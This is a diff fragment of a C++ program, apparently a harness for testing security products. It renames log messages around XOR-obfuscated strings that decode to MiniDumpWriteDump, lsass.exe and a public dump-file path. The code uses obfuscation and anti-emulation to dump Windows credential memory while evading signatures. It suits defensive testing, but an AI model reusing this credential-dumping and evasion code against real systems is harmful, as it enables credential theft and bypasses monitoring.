@@ -143,7 +143,7 @@ int main(int argc, char** argv) {
     // init strings
     // antiemulation and deconditioning also depend on obfuscation (anti signature)
 #if defined obfuscation || defined antiEmulation || defined deconditioning
-    msg << "Before decrypting strings";
+    msg << "Before getting strings";
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
 
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=QzpcXFVzZXJzXFxQdWJsaWNcXERvd25sb2Fkc1xcdGVzdC5kbXBcMA
@@ -158,7 +158,7 @@ int main(int argc, char** argv) {
     BYTE dumpFunctionBytes[] = { 0x0e,0x2d,0x2d,0x2d,0x07,0x31,0x2e,0x34,0x14,0x36,0x2a,0x30,0x26,0x00,0x36,0x29,0x33,0x44 };
     for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
 
-    msg << "After decrypting strings";
+    msg << "After getting strings";
     print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
     Sleep(sleep_between_steps_ms);
 #else
@@ -256,14 +256,14 @@ int main(int argc, char** argv) {
     // init strings
     // antiemulation and deconditioning also depend on obfuscation (anti signature)
 #if defined obfuscation || defined antiEmulation || defined deconditioning
-    msg << "Before decrypting target proc string";
+    msg << "Before getting target proc string";
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
 
     // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
     BYTE procBytes[] = { 0x2f,0x44,0x30,0x44,0x22,0x44,0x30,0x44,0x30,0x44,0x6d,0x44,0x26,0x44,0x3b,0x44,0x26,0x44,0x43,0x44 };
     for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
 
-    msg << "After decrypting target proc string";
+    msg << "After getting target proc string";
     print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
     Sleep(sleep_between_steps_ms);
 #else
